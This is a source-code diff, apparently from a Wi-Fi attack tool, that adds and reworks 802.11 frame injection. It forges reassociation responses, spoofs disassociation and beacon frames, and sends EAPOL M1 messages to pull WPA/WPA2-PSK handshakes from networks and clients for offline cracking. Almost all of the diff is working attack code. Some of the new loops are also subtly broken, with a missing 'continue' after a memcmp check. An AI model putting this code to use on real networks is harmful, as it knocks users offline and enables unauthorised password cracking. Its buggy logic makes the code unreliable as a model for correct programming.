@@ -747,6 +747,56 @@ qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_b
 return;
 }
 /*===========================================================================*/
+static inline void send_reassociation_resp()
+{
+static mac_t *macftx;
+
+static const uint8_t reassociationresponsedata[] =
+{
+/* Fixed parameters (6 bytes) Fixed parameters (6 bytes) */
+0x11, 0x04,
+0x00, 0x00,
+0x01, 0xc0,
+/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
+0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
+/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
+0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
+/* Tag: Extended Capabilities (8 octets) */
+0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
+};
+#define REASSOCIATIONRESPONSE_SIZE sizeof(reassociationresponsedata)
+
+if(filtermode == 1)
+	{
+	if(isclientinfilterlist(macfrx->addr2) == true) return;
+	}
+else if(filtermode ==2)
+	{
+	if(isclientinfilterlist(macfrx->addr2) == false) return;
+	}
+packetoutptr = epbown +EPB_SIZE;
+memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE +1);
+memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
+macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
+macftx->type = IEEE80211_FTYPE_MGMT;
+macftx->subtype = IEEE80211_STYPE_REASSOC_RESP;
+memcpy(macftx->addr1, macfrx->addr2, 6);
+memcpy(macftx->addr2, macfrx->addr1, 6);
+memcpy(macftx->addr3, macfrx->addr1, 6);
+macftx->duration = 0x013a;
+macftx->sequence = myapsequence++ << 4;
+if(myapsequence >= 4096) myapsequence = 1;
+memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &reassociationresponsedata, REASSOCIATIONRESPONSE_SIZE);
+if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +REASSOCIATIONRESPONSE_SIZE) < 0)
+	{
+	perror("\nfailed to transmit associationresponse");
+	errorcount++;
+	}
+fsync(fd_socket);
+outgoingcount++;
+return;
+}
+/*===========================================================================*/
 static inline void send_association_resp()
 {
 static mac_t *macftx;
@@ -797,7 +847,7 @@ outgoingcount++;
 return;
 }
 /*===========================================================================*/
-static inline void send_reassociation_req_wpa1(maclist_t *zeiger)
+static inline void send_reassociation_req_wpa1(uint8_t *macclient, maclist_t *zeiger)
 {
 static mac_t *macftx;
 static capreqsta_t *stacapa;
@@ -837,7 +887,7 @@ macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
 macftx->type = IEEE80211_FTYPE_MGMT;
 macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
 memcpy(macftx->addr1, zeiger->addr, 6);
-memcpy(macftx->addr2, macfrx->addr1, 6);
+memcpy(macftx->addr2, macclient, 6);
 memcpy(macftx->addr3, zeiger->addr, 6);
 macftx->duration = 0x013a;
 macftx->sequence = myclientsequence++ << 4;
@@ -862,7 +912,7 @@ outgoingcount++;
 return;
 }
 /*===========================================================================*/
-static inline void send_reassociation_req_wpa2(maclist_t *zeiger)
+static inline void send_reassociation_req_wpa2(uint8_t *macclient, maclist_t *zeiger)
 {
 static mac_t *macftx;
 static capreqsta_t *stacapa;
@@ -903,7 +953,7 @@ macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
 macftx->type = IEEE80211_FTYPE_MGMT;
 macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
 memcpy(macftx->addr1, zeiger->addr, 6);
-memcpy(macftx->addr2, macfrx->addr1, 6);
+memcpy(macftx->addr2, macclient, 6);
 memcpy(macftx->addr3, zeiger->addr, 6);
 macftx->duration = 0x013a;
 macftx->sequence = myclientsequence++ << 4;
@@ -2357,6 +2407,7 @@ for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
 	zeiger->timestamp = timestamp;
 	zeiger->count += 1;
+	if(zeiger->status <= NET_M1) send_ack();
 	if((zeiger->status &NET_REASSOC_RESP) != NET_REASSOC_RESP)
 		{
 		if(fd_pcapng > 0)
@@ -2428,6 +2479,25 @@ for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 			}
 		zeiger->status |= NET_REASSOC_REQ;
 		}
+	if((zeiger->status) >= NET_M2) continue;
+	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
+		{
+		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
+			{
+			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
+				{
+				send_ack();
+				send_reassociation_resp();
+				send_m1_wpa2();
+				}
+			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
+				{
+				send_ack();
+				send_reassociation_resp();
+				send_m1_wpa1();
+				}
+			}
+		}
 	return;
 	}
 ringbuffercount = zeiger -aplist;
@@ -2458,25 +2528,47 @@ qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
 return;
 }
 /*===========================================================================*/
+static inline void process80211blockack_req()
+{
+static maclist_t *zeiger;
+
+for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
+	{
+	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0)
+	zeiger->timestamp = timestamp;
+	if(zeiger->status >= NET_M2) return;
+	if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+		{
+		send_ack();
+		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(macfrx->addr1, zeiger);
+		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(macfrx->addr1, zeiger);
+		}
+	return;
+	}
+return;
+}
+/*===========================================================================*/
 static inline void process80211blockack()
 {
 static maclist_t *zeiger;
 
 for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
-	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
+	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0)
 	zeiger->timestamp = timestamp;
 	if(zeiger->status >= NET_M2) return;
 	if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
 		{
 		send_ack();
-		send_reassociation_req_wpa2(zeiger);
-		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
-		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
+		send_disassociation(macfrx->addr1, macfrx->addr2, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(macfrx->addr1, zeiger);
+		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(macfrx->addr1, zeiger);
 		}
 	return;
 	}
-if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_disassociation(macfrx->addr1, macfrx->addr2, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+return;
 }
 /*===========================================================================*/
 static inline void process80211powersave_poll()
@@ -2489,16 +2581,26 @@ for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
 	zeiger->timestamp = timestamp;
 	if(zeiger->status >= NET_M2) return;
-	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
+	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
 		{
-		send_ack();
-		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
-		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE)
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+			send_reassociation_req_wpa2(macfrx->addr2, zeiger);
+			}
+		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+			send_reassociation_req_wpa1(macfrx->addr2, zeiger);
+			}
 		}
 	return;
-	break;
 	}
-if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
 return;
 }
 /*===========================================================================*/
@@ -2509,36 +2611,93 @@ static maclist_t *zeiger;
 if(macfrx->power == 1) return;
 for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
-	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
-	zeiger->timestamp = timestamp;
-	if(zeiger->status >= NET_M2) return;
-	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_ack();
-	if((macfrx->to_ds == 1) && (macfrx->power == 0))
+	if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 		{
-		if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
-		return;
-		}
-	if((macfrx->from_ds == 1) && (macfrx->power == 0))
-		{
-		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
+		if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
+		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
 			{
-			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
 			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+			if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(macfrx->addr2, zeiger);
+			else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(macfrx->addr2, zeiger);
 			}
-		return;
 		}
-	}
-if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
-	{
-	if((macfrx->to_ds == 1) && (macfrx->power == 0))
+	if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
 		{
-		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
-		return;
+		if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
+		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+			}
 		}
+	return;
 	}
-if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
+if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 	{
-	if((macfrx->from_ds == 1) && (macfrx->power == 0)) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	return;
+	}
+if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
+	{
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+	}
+return;
+}
+/*===========================================================================*/
+static inline void process80211qosnull()
+{
+static maclist_t *zeiger;
+
+if(macfrx->power == 1) return;
+for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
+	{
+	if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
+		{
+		if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
+		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+			if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(macfrx->addr2, zeiger);
+			else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(macfrx->addr2, zeiger);
+			}
+		}
+	if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
+		{
+		if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
+		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+			}
+		}
+	return;
+	}
+if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
+	{
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	return;
+	}
+if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
+	{
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
 	}
 return;
 }
@@ -2560,41 +2719,50 @@ if(fd_pcapng > 0)
 	{
 	if((pcapngframesout &PCAPNG_FRAME_WPA) == PCAPNG_FRAME_WPA) writeepb(fd_pcapng);
 	}
+
 for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
 	{
-	if(zeiger->timestamp == 0) break;
-	if(memcmp(zeiger->addr, macfrx->addr2, 6) == 0)
+	if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 		{
+		if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
 		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
 		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
-		if(zeiger->status < NET_M2)
 			{
-			if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger);
-			else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger);
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
+			if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(macfrx->addr2, zeiger);
+			else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(macfrx->addr2, zeiger);
 			}
-		return;
 		}
-	if(memcmp(zeiger->addr, macfrx->addr3, 6) != 0) continue;
-	zeiger->timestamp = timestamp;
-	if(zeiger->status < NET_M1) break;
+	if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
+		{
+		if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
+		zeiger->timestamp = timestamp;
+		if(zeiger->status >= NET_M2) return;
+		if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+			{
+			send_ack();
+			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
+			}
+		}
 	return;
 	}
-if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
+if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
+if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
 	{
-	if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0)
-		{
-		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
-		return;
-		}
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
+	return;
 	}
-if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
+if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
 	{
-	if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0)
-		{
-		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
-		return;
-		}
+	send_ack();
+	send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
 	}
+
+
 return;
 }
 /*===========================================================================*/
@@ -3314,14 +3482,20 @@ if(macfrx->type == IEEE80211_FTYPE_MGMT)
 else if(macfrx->type == IEEE80211_FTYPE_CTL)
 	{
 	if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
-	if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
+	else if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
+	else if(macfrx->subtype == IEEE80211_STYPE_BACK_REQ) process80211blockack_req();
 	else return;
 	}
 else if(macfrx->type == IEEE80211_FTYPE_DATA)
 	{
-	if(((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC) || ((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC))
+	if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC)
 		{
 		process80211null();
+		return;
+		}
+	if((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC)
+		{
+		process80211qosnull();
 		return;
 		}
 	qosflag = false;
